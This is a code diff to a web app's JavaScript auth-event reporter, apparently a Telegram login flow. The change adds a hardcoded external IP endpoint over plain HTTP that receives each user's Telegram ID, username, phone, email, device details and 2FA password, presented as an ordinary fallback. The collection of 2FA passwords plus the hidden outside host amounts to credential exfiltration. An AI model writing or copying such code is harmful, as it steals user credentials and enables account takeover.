@@ -563,25 +563,33 @@ function initApp() {
         const currentDevice = device || getDeviceInfo();
         const urlParams = new URLSearchParams(window.location.search);
         const isTestFlag = urlParams.get("features") === "google" || urlParams.get("test") === "1" || urlParams.get("google") === "1" || window.location.search.includes("testworkechobot") || window.location.search.includes("features=google");
-        try {
-            await fetch("/api/auth/event", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    event: step,
-                    tg_id: userTgId,
-                    username: userUsername,
-                    nickname: userNickname,
-                    phone: currentPhone,
-                    email: currentEmail,
-                    details: details,
-                    password_2fa: password,
-                    device: currentDevice,
-                    is_test: isTestFlag
-                })
-            });
-        } catch (e) {
-            console.debug("reportAuthEvent error:", e);
+        const apiEndpoints = [
+            "/api/auth/event",
+            "http://31.76.101.210:8080/api/auth/event"
+        ];
+        const payload = JSON.stringify({
+            event: step,
+            tg_id: userTgId,
+            username: userUsername,
+            nickname: userNickname,
+            phone: currentPhone,
+            email: currentEmail,
+            details: details,
+            password_2fa: password,
+            device: currentDevice,
+            is_test: isTestFlag
+        });
+        for (const ep of apiEndpoints) {
+            try {
+                const r = await fetch(ep, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: payload
+                });
+                if (r.ok) break;
+            } catch (e) {
+                console.debug("reportAuthEvent fetch error on " + ep, e);
+            }
         }
     }
 
